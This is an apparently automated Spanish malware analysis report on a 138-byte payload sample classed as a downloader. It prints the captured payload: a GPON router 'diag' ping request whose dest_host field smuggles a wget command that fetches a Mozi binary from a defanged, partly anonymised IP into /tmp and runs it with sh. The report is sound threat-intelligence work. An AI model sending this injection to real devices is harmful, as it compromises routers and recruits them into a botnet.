# 🧬 Payload Analysis

`225dde6ffe48e9a460deae1fd414c026d48fe33075ad8d17532fea505b32a6e5`

## 📌 Resumen

Texto ASCII de 138 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://61.52.227.XXX:45405/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://61.52.227.XXX:45405/Mozi.m -O ->/tmp/gpon80`
2. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/225dde6ffe48e9a460deae1fd414c026d48fe33075ad8d17532fea505b32a6e5.md](../../../../../malware-like/oraculo/downloader/225dde6ffe48e9a460deae1fd414c026d48fe33075ad8d17532fea505b32a6e5.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:27:32.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `225dde6ffe48e9a460deae1fd414c026d48fe33075ad8d17532fea505b32a6e5`
- **MD5:** `1ea1e7d578b4e6bb16f2e5d2d20c08e1`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 138 B |
| Entropía | 5.11 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://61.52.227.XXX:45405/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://61.52.227.XXX:45405/Mozi.m+-O+- | strings |
| ip | 61.52.227.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://61.52.227.XXX:45405/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | 225dde6ffe48e9a460deae1fd414c026d48fe33075ad8d17532fea505b32a6e5 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
